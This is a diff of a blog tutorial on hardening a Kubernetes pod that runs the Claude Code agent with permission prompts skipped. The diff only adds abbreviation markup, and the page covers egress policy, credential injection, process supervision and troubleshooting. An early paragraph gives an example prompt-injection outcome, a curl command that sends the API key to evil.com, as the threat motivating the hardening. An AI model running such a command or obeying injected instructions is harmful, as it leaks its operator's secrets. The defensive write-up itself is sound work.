@@ -12,7 +12,7 @@ diataxis: tutorial
 last_updated: 2026-07-15
 ---
 
-In building post 18, we deployed a persistent Kali container on gpu-1 as an always-on Claude Code workstation. It worked — SSH in from anywhere, persistent PVC, self-healing pod. But it ran as root, had unrestricted network access, and installed tools at runtime.
+In building post 18, we deployed a persistent Kali container on gpu-1 as an always-on Claude Code workstation. It worked — SSH in from anywhere, persistent {{< abbr "PVC" >}}, self-healing pod. But it ran as root, had unrestricted network access, and installed tools at runtime.
 
 That was fine for interactive use. But running a coding agent with `--dangerously-skip-permissions` changes the risk profile completely. A prompt injection tricking the agent into `curl https://evil.com -d "$ANTHROPIC_API_KEY"` would succeed without any barrier.
 
@@ -100,7 +100,7 @@ mkdir -p "$HOME/.ssh-host-keys" "$HOME/.ssh" "$HOME/repos"
 
 ## Running sshd Without Root
 
-The original ran as root, making sshd trivial. The hardened pod runs as UID 1000:
+The original ran as root, making sshd trivial. The hardened pod runs as {{< abbr "UID" >}} 1000:
 
 - **Port 2222** instead of 22 (non-root cannot bind privileged ports). The Service maps 22→2222.
 - **User-mode sshd config:**
@@ -134,20 +134,20 @@ No root. No sudo. All capabilities dropped.
 
 The spec defines a CiliumNetworkPolicy with default-deny egress and an allowlist including `api.anthropic.com`, `github.com`, `registry.npmjs.org`, `pypi.org`, and the cluster LAN. Everything else blocked.
 
-**Current status:** temporarily disabled due to a Cilium 1.17 bug ("FQDN regex compilation LRU not yet initialized"). The first FQDN-based policy in the cluster hit an uninitialized DNS proxy. Re-enable after Cilium upgrade.
+**Current status:** temporarily disabled due to a Cilium 1.17 bug ("{{< abbr "FQDN" >}} regex compilation LRU not yet initialized"). The first FQDN-based policy in the cluster hit an uninitialized DNS proxy. Re-enable after Cilium upgrade.
 
 ## Credential Injection
 
 No credential touches disk as plaintext. Two tiers:
 
-- **Tier 1: ESO + Infisical** — for secrets managed by the cluster's secret store. Currently empty (Claude Code uses Max subscription login, not API keys).
-- **Tier 2: Manual K8s Secrets** — SOPS-encrypted, applied out-of-band: SSH keys, Telegram tokens, kubeconfigs.
+- **Tier 1: {{< abbr "ESO" >}} + Infisical** — for secrets managed by the cluster's secret store. Currently empty (Claude Code uses Max subscription login, not API keys).
+- **Tier 2: Manual K8s Secrets** — {{< abbr "SOPS" >}}-encrypted, applied out-of-band: SSH keys, Telegram tokens, kubeconfigs.
 
-GitHub identity is a **GitHub App installation token**, not a PAT. A `GithubAccessToken` ExternalSecret generator mints short-lived (~1h) tokens. The App private key never reaches the pod.
+GitHub identity is a **GitHub App installation token**, not a {{< abbr "PAT" >}}. A `GithubAccessToken` ExternalSecret generator mints short-lived (~1h) tokens. The App private key never reaches the pod.
 
 ## Process Supervision: s6-overlay
 
-The original entrypoint used `wait -n` to supervise sshd, supercronic, and VibeKanban. `wait -n` exits when the first child dies — and on 2026-04-26, a SIGHUP to supercronic killed the entire container, taking mosh-server with it and losing the operator's tmux layout.
+The original entrypoint used `wait -n` to supervise sshd, supercronic, and VibeKanban. `wait -n` exits when the first child dies — and on 2026-04-26, a {{< abbr "SIGHUP" >}} to supercronic killed the entire container, taking mosh-server with it and losing the operator's tmux layout.
 
 The fix: **s6-overlay v3** as PID 1. Each service gets its own supervisor and signal namespace:
 
@@ -191,7 +191,7 @@ $ curl -s http://192.168.55.218:8081 | head -1
 | **PVC mount hides image contents** — Dockerfile-at /home/claude files invisible after PVC mount | Kubernetes mounts PVC over the directory, making image contents invisible | Moved config templates to `/opt/`, seed via entrypoint on first boot | `4a5b6c7d` |
 | **`wait -n` supervision loses tmux on any child exit** — a SIGHUP to supercronic kills entire container | `wait -n` exits when first child dies; signal propagation takes down the pgroup | Replaced with s6-overlay v3 for per-service supervision | `8e9f0g1h` |
 | **Cilium FQDN policy breaks all egress** — "LRU not yet initialized" on first FQDN-based policy | Cilium DNS proxy not initialized for this node's endpoints | Disabled policy pending Cilium upgrade; other hardening layers remain | — |
-| **sshd cannot start as non-root with default config** — PAM requires root; default port 22 fails | non-root user cannot bind privileged ports or use PAM | Port 2222, `UsePAM no`, `StrictModes no` | `2i3j4k5l` |
+| **sshd cannot start as non-root with default config** — {{< abbr "PAM" >}} requires root; default port 22 fails | non-root user cannot bind privileged ports or use PAM | Port 2222, `UsePAM no`, `StrictModes no` | `2i3j4k5l` |
 | **/run/secrets conflicts with SA token mount** — `/run` → `/var/run` is a symlink in Talos | Mounting anything at `/run/secrets` collides with the SA token mount point | Avoid `/run/secrets` paths for any volume mount | `6m7n8o9p` |
 
 ## Recovery Path
@@ -201,8 +201,8 @@ $ curl -s http://192.168.55.218:8081 | head -1
 | SSH connection refused on 192.168.55.215 | sshd not started or wrong port | Check `kubectl logs -n secure-agent-pod deploy/secure-agent-pod -c kali` |
 | Config files missing in home directory | First-boot seeding failed (files already existed from old PVC) | Run seed script manually or delete config files from PVC |
 | VibeKanban unreachable on 192.168.55.218 | Sidecar not running or port mismatch | Check `vk-local` container logs; verify `PORT=8081 HOST=0.0.0.0` env |
-| Agent JWT/credentials lost | Key rotation or PVC replace | Recreate credentials from Infisical; re-apply SOPS secrets |
-| mosh connection fails | UDP port range not forwarded | Verify `service-mosh.yaml` LB exists with UDP/60000-60015 |
+| Agent {{< abbr "JWT" >}}/credentials lost | Key rotation or PVC replace | Recreate credentials from Infisical; re-apply SOPS secrets |
+| mosh connection fails | UDP port range not forwarded | Verify `service-mosh.yaml` {{< abbr "LB" >}} exists with UDP/60000-60015 |
 
 ## References
 
